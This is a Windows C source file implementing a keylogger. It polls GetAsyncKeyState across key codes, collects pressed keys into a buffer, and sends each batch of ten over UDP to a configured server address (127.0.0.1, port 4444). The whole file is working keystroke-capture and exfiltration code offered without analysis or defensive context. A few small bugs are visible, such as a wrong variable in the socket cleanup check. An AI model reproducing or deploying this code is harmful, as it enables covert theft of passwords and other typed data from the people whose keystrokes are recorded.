#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <fileapi.h>
#include <stdbool.h>
#include <conio.h>


#include "return_codes.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma warning(disable:4996) 

enum result {
    R_UNISTALLIZED = -1,
    R_SUCCESS,
    R_ERROR
};

typedef enum result result_t;

#define SYS_CALL_SUCCSSES 0
#define PORT_NUM 4444
#define SERVER_IP "127.0.0.1"
#define MAX_MSG_LENGTH 1024
#define BUFFER_LENGTH 10
#define KEY_PRESSED_SINCE_LAST_CALL 0x0001

int main(int argc, char** argv)
{
    result_t result = R_UNISTALLIZED;
    int key_counter = 0;
    WSADATA wsa = { 0 };
    SOCKET client_socket = NULL;
    struct sockaddr_in server_address = { 0 };
    char msg_buf[MAX_MSG_LENGTH] = { 0 };

    printf("Initializing Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("Failed. Error Code : %d", WSAGetLastError());
        result = ERROR;
        goto end;
    }

    printf("Initialised.\n");

    client_socket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (client_socket == INVALID_SOCKET)
    {
        printf("Could not create socket : %d", WSAGetLastError());
        result = ERROR;
        goto end;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_port = htons(PORT_NUM);
    server_address.sin_addr.S_un.S_addr = inet_addr(SERVER_IP);
    
    //start communication
    while (1)
    {
		for (int i = 8; i <= 190; i++) {
			// if (GetAsyncKeyState(i) == -32767)
            if (GetAsyncKeyState(i) & KEY_PRESSED_SINCE_LAST_CALL)
            {
                msg_buf[key_counter] = i;
                key_counter++;
            }
		}
        
        if (key_counter < BUFFER_LENGTH)
            continue;

        //send the message
        if (sendto(client_socket, msg_buf, BUFFER_LENGTH, 0, (struct sockaddr*)&server_address, sizeof(server_address)) == SOCKET_ERROR)
        {
            printf("sendto() failed with error code : %d", WSAGetLastError());
            exit(EXIT_FAILURE);
        }

        // Reset buffer after sending message.
        key_counter = 0;
    }
    
end:
    if (socket != NULL)
        closesocket(client_socket);
    WSACleanup();
    return result;
}
